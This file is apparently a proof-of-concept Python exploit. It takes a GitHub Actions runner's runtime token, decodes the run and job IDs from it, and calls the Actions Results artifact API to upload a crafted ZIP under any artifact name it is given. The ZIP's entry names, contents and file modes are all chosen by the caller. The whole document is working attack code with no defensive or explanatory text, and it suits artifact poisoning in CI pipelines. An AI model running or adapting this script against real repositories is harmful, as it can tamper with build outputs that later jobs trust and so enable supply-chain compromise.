#!/usr/bin/env python3
"""Upload a crafted ZIP to the Actions Results service under an arbitrary artifact name."""
import os, sys, json, base64, hashlib, io, zipfile, urllib.request, urllib.error, urllib.parse

def b64d(s):
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)

def make_zip(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        for e in entries:
            if e.get("file"):
                data = open(e["file"], "rb").read()
            else:
                data = e.get("content", "").encode()
            zi = zipfile.ZipInfo(e["name"])
            zi.create_system = 3
            zi.external_attr = (e.get("mode", 0o100644)) << 16
            zi.compress_type = zipfile.ZIP_STORED
            z.writestr(zi, data)
    return buf.getvalue()

def post(url, token, body):
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method="POST", headers={
        "Content-Type": "application/json", "Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def put(url, blob):
    req = urllib.request.Request(url, data=blob, method="PUT", headers={
        "x-ms-blob-type": "BlockBlob", "Content-Type": "application/zip",
        "x-ms-version": "2021-12-02", "Content-Length": str(len(blob))})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def main():
    name = os.environ["INPUT_NAME"]
    entries = json.loads(os.environ["INPUT_ENTRIES"])
    token = os.environ["ACTIONS_RUNTIME_TOKEN"]
    u = urllib.parse.urlsplit(os.environ["ACTIONS_RESULTS_URL"])
    origin = "%s://%s" % (u.scheme, u.netloc)
    claims = json.loads(b64d(token.split(".")[1]))
    run_id = job_id = None
    for scope in claims.get("scp", "").split():
        if scope.startswith("Actions.Results:"):
            _, run_id, job_id = scope.split(":")
    print("POC_UPLOAD name=%r entries=%s run=%s job=%s" % (name, [e["name"] for e in entries], run_id, job_id), flush=True)
    blob = make_zip(entries)
    api = origin + "/twirp/github.actions.results.api.v1.ArtifactService/"
    st, body = post(api + "CreateArtifact", token, {
        "workflowRunBackendId": run_id, "workflowJobRunBackendId": job_id,
        "name": name, "version": 7, "mimeType": "application/zip"})
    print("POC_CREATE name=%r status=%s body=%s" % (name, st, body[:300]), flush=True)
    if st != 200:
        return 1
    signed = json.loads(body).get("signedUploadUrl") or json.loads(body).get("signed_upload_url")
    st, body = put(signed, blob)
    print("POC_PUT name=%r status=%s" % (name, st), flush=True)
    st, body = post(api + "FinalizeArtifact", token, {
        "workflowRunBackendId": run_id, "workflowJobRunBackendId": job_id, "name": name,
        "size": str(len(blob)),
        "hash": "sha256:" + hashlib.sha256(blob).hexdigest()})
    print("POC_FINAL name=%r status=%s body=%s" % (name, st, body[:200]), flush=True)
    return 0 if st == 200 else 1

sys.exit(main())
